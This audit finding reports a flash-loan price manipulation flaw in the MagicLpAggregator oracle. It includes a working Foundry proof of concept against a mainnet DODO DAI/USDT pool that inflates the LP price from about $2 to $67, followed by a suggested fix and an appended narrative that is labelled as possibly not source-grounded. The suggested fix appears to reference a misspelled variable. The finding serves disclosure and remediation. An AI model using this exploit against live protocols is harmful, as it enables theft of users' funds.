---
id: 20871
severity: "High"
---

# Oracle price can be manipulated

## Description

Oracle price can be manipulated.

## Proof of Concept

MagicLpAggregator uses pool reserves to calculate the price of the pair token,
```solidity
        function _getReserves() internal view virtual returns (uint256, uint256) {
            (uint256 baseReserve, uint256 quoteReserve) = pair.getReserves();
        }
    
        function latestAnswer() public view override returns (int256) {
            uint256 baseAnswerNomalized = uint256(baseOracle.latestAnswer()) * (10 ** (WAD - baseOracle.decimals()));
            uint256 quoteAnswerNormalized = uint256(quoteOracle.latestAnswer()) * (10 ** (WAD - quoteOracle.decimals()));
            uint256 minAnswer = baseAnswerNomalized < quoteAnswerNormalized ? baseAnswerNomalized : quoteAnswerNormalized;
    
            (uint256 baseReserve, uint256 quoteReserve) = _getReserves();
            baseReserve = baseReserve * (10 ** (WAD - baseDecimals));
            quoteReserve = quoteReserve * (10 ** (WAD - quoteDecimals));
            return int256(minAnswer * (baseReserve + quoteReserve) / pair.totalSupply());
        }
```
However, reserve values can be manipulated. For example, an attacker can use a flash loan to inflate the pair price, see coded POC below
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "utils/BaseTest.sol";
import "oracles/aggregators/MagicLpAggregator.sol";

// import "forge-std/console2.sol";

interface IDodo {
    function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve);
    function _QUOTE_TOKEN_() external view returns (address);
    function sellBase(address to) external returns (uint256);
    function sellQuote(address to) external returns (uint256);
}

interface IFlashMinter {
    function flashLoan(address, address, uint256, bytes memory) external;
}

contract MagicLpAggregatorExt is MagicLpAggregator {

    constructor(
        IMagicLP pair_,
        IAggregator baseOracle_,
        IAggregator quoteOracle_
    ) MagicLpAggregator(pair_, baseOracle_, quoteOracle_) {}

    function _getReserves() internal view override returns (uint256, uint256) {
        return IDodo(address(pair)).getVaultReserve();
    }

}

contract Borrower {
    IFlashMinter private immutable minter;
    IDodo private immutable dodoPool;
    MagicLpAggregator private immutable oracle;

    constructor(address _minter, address _dodoPool, address _oracle) {
        minter = IFlashMinter(_minter);
        dodoPool = IDodo(_dodoPool);
        oracle = MagicLpAggregator(_oracle); 
    }

    /// Initiate a flash loan
    function flashBorrow(address token, uint256 amount) public {
        IERC20Metadata(token).approve(address(minter), ~uint256(0));
        minter.flashLoan(address(this), token, amount, "");
    }
    /// ERC-3156 Flash loan callback
    function onFlashLoan(
        address initiator,
        address token, // DAI
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // tamper with the DAI/USDT pool
        IERC20Metadata(token).transfer(address(dodoPool), amount);
        dodoPool.sellBase(address(this));
        IERC20Metadata quote = IERC20Metadata(dodoPool._QUOTE_TOKEN_());
        uint256 quoteAmount = quote.balanceOf(address(this));
        // pair price after tampering
        uint256 response = uint256(oracle.latestAnswer());
        console.log("BAD ANSWER: ", response);
        // Do something evil here

        // swap tokens back and repay the loan
        address(quote).call{value: 0}(abi.encodeWithSignature("transfer(address,uint256)", address(dodoPool), quoteAmount));
        dodoPool.sellQuote(address(this));
        IERC20Metadata(token).transfer(initiator, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract MagicLpAggregatorTest is BaseTest {
    MagicLpAggregatorExt aggregator;
    address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant DAI_MINTER = 0x60744434d6339a6B27d73d9Eda62b6F66a0a04FA;
    address constant DODO_POOL = 0x3058EF90929cb8180174D74C507176ccA6835D73;

    function setUp() public override {
        fork(ChainId.Mainnet, 19365773);
        _setUp();
    }

    function _setUp() public {
        super.setUp();

        aggregator = new MagicLpAggregatorExt(
            IMagicLP(DODO_POOL),
            IAggregator(0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9),
            IAggregator(0x3E7d1eAB13ad0104d2750B8863b489D65364e32D)
        );
    }

    function testGetResult() public {
        uint256 response = uint256(aggregator.latestAnswer());
        // pair price before ~ $2
        assertEq(response, 2000502847471294054);
        console.log("GOOD ANSWER: ", response);
        // use DAI flash minter to inflate the pair price to $67
        Borrower borrower = new Borrower(DAI_MINTER, DODO_POOL, address(aggregator));
        deal(DAI, address(borrower), 1100 * 1e18);
        IERC20Metadata(DAI).approve(address(borrower), type(uint256).max);
        borrower.flashBorrow(DAI, 100_000_000 ether);
    }
}
```
In this test, a user increased the price of DAI/USDT pair token from 2 USD to 67 USD using DAI Flash Minter.

## Recommendation

Consider adding a sanity check, where base and quote token prices are compared with the chainlink price feed
```solidity
        function latestAnswer() public view override returns (int256) {
            uint256 baseAnswerNomalized = uint256(baseOracle.latestAnswer()) * (10 ** (WAD - baseOracle.decimals()));
            uint256 quoteAnswerNormalized = uint256(quoteOracle.latestAnswer()) * (10 ** (WAD - quoteOracle.decimals()));
            uint256 minAnswer = baseAnswerNomalized < quoteAnswerNormalized ? baseAnswerNomalized : quoteAnswerNormalized;
    
            uint256 midPrice = pair.getMidPrice() * (10 ** (WAD - 6));
            uint256 feedPrice = baseAnswerNormalized * WAD / quoteAnswerNormalized;
            uint256 difference = midPrice > feedPrice
                ? (midPrice - feedPrice) * 10000 / midPrice
                : (feedPrice - midPrice) * 10000 / feedPrice;
            // if too big difference - revert
            if (difference >= MAX_DIFFERENCE) {
                revert PriceDifferenceExceeded();
            }
    
            (uint256 baseReserve, uint256 quoteReserve) = _getReserves();
            baseReserve = baseReserve * (10 ** (WAD - baseDecimals));
            quoteReserve = quoteReserve * (10 ** (WAD - quoteDecimals));
            return int256(minAnswer * (baseReserve + quoteReserve) / pair.totalSupply());
        }
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a price manipulation flaw in an on‑chain oracle that derives the value of a liquidity‑provider (LP) token from the raw reserves of a DEX pool. The contract reads the base and quote token reserves directly, normalises them, and combines them with external Chainlink price feeds to produce a composite price. Because the reserve values are taken from the pool at the moment the function is called, an attacker can temporarily distort those reserves using a flash loan. By borrowing a large amount of one token, depositing it into the pool and performing a swap, the attacker inflates the apparent price of the LP token. The oracle then reads the manipulated reserves and returns an artificially high price. This inflated price can be used in downstream protocol logic – for example to mint new tokens, trigger liquidations, or settle trades – allowing the attacker to extract value while the price is distorted. The impact is that users may receive an incorrect valuation, leading to over‑collateralisation, loss of funds, or unfair profit for the attacker. The issue occurs whenever the oracle’s latestAnswer function is called while the pool’s reserves are being temporarily altered, which is possible in a single transaction thanks to flash‑loan capabilities. All participants that rely on the oracle – token holders, lenders, borrowers, and the protocol itself – are affected because the price feed no longer reflects the true market price. The flaw was discovered during a security audit when the auditors constructed a flash‑loan test that showed the oracle’s answer jumping from roughly $2 to $67 for the DAI/USDT pair. The problem is subtle because the price deviation exists only for the duration of the transaction and leaves no persistent state change, making it hard to detect through ordinary monitoring. To remediate, the oracle should not trust raw pool reserves alone; it must incorporate a sanity check that compares the derived price against a trusted external feed (such as Chainlink) and reject answers that deviate beyond a reasonable threshold. Additional mitigations include using time‑weighted average prices, limiting the influence of a single block’s reserve snapshot, or requiring a minimum time delay before a price can be used for critical actions. In essence, the bug belongs to the class of oracle manipulation vulnerabilities where on‑chain data sources can be temporarily skewed, breaking the accounting assumptions of the protocol and causing funds to disappear or be mis‑priced.
